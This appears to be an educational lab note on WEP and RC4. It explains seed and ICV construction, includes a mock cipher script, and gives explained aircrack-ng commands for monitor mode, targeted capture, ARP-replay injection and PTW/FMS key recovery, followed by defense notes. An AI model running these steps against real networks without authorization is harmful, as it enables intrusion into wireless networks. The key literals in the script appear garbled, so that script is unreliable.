# Chain #18: WEP & RC4 — seed, ICV, mock cipher, and practical attacks

## Goal & Scope

Short, hands‑on introduction to WEP and RC4:

- WEP primitives (IV, key sizes, RC4, ICV/CRC32).
- How WEP builds an RC4 seed (IV + key) and encrypts a frame.
- CRC32 / ICV generation and a runnable `mockcipher.py` that demonstrates the full flow.
- Practical attack overview: IV collection, ARP replay, FMS / PTW, and KoreK Chop‑Chop ideas.
- Canonical lab commands (explained) and remediation notes.

---

## Summary (one‑page)

WEP uses a 24‑bit IV concatenated with a per‑device secret key (commonly 40‑bit or 104‑bit) as the RC4 seed. RC4 produces a keystream which XORs with `plaintext || ICV` (ICV = CRC32(plaintext)). The IV is transmitted in clear, and its small size leads to IV reuse; attackers exploit this with statistical (FMS/PTW) or packet‑building attacks (ARP replay) to recover keys quickly.

---

## Key details & canonical commands (explained)

**Canonical dummies used below:**

- Managed Interface: `wlan0`
- Monitor Interface: `wlan0mon`
- AP BSSID: `AA:BB:CC:DD:EE:FF`
- Client MAC: `11:22:33:44:55:66`
- Channel: 6
- Capture Filename: `WPA-01.cap`

### 1) Put interface into monitor mode

```
sudo airmon-ng check kill
```

- Kills interfering services (NetworkManager, `wpa_supplicant`).

```
sudo airmon-ng start wlan0
```

- Starts monitor mode; typical monitor interface is `wlan0mon`.

### 2) Capture only the target AP on channel 6 and write captures

```
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w WPA
```

- `-c 6`: lock channel to 6.    
- `--bssid`: focus on the AP.
- `-w WPA`: write capture files with prefix `WPA` (creates e.g. `WPA-01.cap`, `WPA-01.ivs`).

### 3) Accelerate IV collection with ARP replay (packet building)

```
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

- `-3`: ARP replay mode — injects forged ARP requests to provoke predictable responses and many IVs.
- `-b`: BSSID of AP. 
- `-h`: source MAC used in forged frames.

**Notes:** requires injection‑capable adapter and may be blocked by AP/client filters. Produces noise.

### 4) Attempt key recovery from IVs

```
aircrack-ng -z -b AA:BB:CC:DD:EE:FF WPA-01.ivs
```

- `-z`: use IV statistical methods (PTW/FMS) on `.ivs` files.
- If cap file used: `aircrack-ng WPA-01.cap -b AA:BB:CC:DD:EE:FF`.

**Interpretation:** aircrack-ng will display candidate keys when the statistical attack succeeds.

---

## Mock cipher: seed + CRC32 + RC4 (runnable)

This mock combines your SeedGen + CRC32 examples into a single script that demonstrates how the IV and key form the RC4 seed, how ICV is created, and how final frame = IV || ciphertext is produced. Save as mockcipher.py and run python3 mockcipher.py.

```python
# mockcipher.py
from Crypto.Random import get_random_bytes
from Crypto.Cipher import ARC4
import zlib

packetplaintext = b'Something Sensitive'
crc32 = zlib.crc32(packetplaintext)
IV = get_random_bytes(3)
key = b''          # 40-bit
Seed64 = IV + key
key104 = b'	

'  # 104-bit
Seed128 = IV + key104
keystream = ARC4.new(Seed64)
keystreamB = ARC4.new(Seed128)
crc32byte = crc32.to_bytes(4, 'big')
ICVMessage = packetplaintext + crc32byte
msg = keystream.encrypt(ICVMessage)
msgB = keystreamB.encrypt(ICVMessage)
finalmsg = IV + msg
finalmsgb = IV + msgB
print('CRC32 Checksum:', crc32)
print('Initialization Vector:', IV)
print('ICV Message:', ICVMessage)
print('Final Message 64-bit Seed:', finalmsg)
```

---

## Short attack taxonomy & when to use each method

- **FMS**: original statistical attack exploiting biased RC4 outputs for weak IVs. Needs many IVs.
- **PTW**: improved statistical attack requiring fewer IVs — preferred when IVs are available.
- **KoreK Chop‑Chop**: per‑packet attack that uses CRC32 behavior to iteratively recover plaintext bytes by observing accept/reject behavior.
- **Packet‑building (ARP replay / fragmentation)**: used to generate IVs quickly when a client responds to forged frames.
- **Per‑packet brute force**: generally impractical except for very small keyspaces/packets.

---

## Defense (short)

- Remove WEP support; migrate to WPA2/WPA3.
- Disable legacy modes on APs when possible.
- Monitor for injection traffic and ARP replay patterns.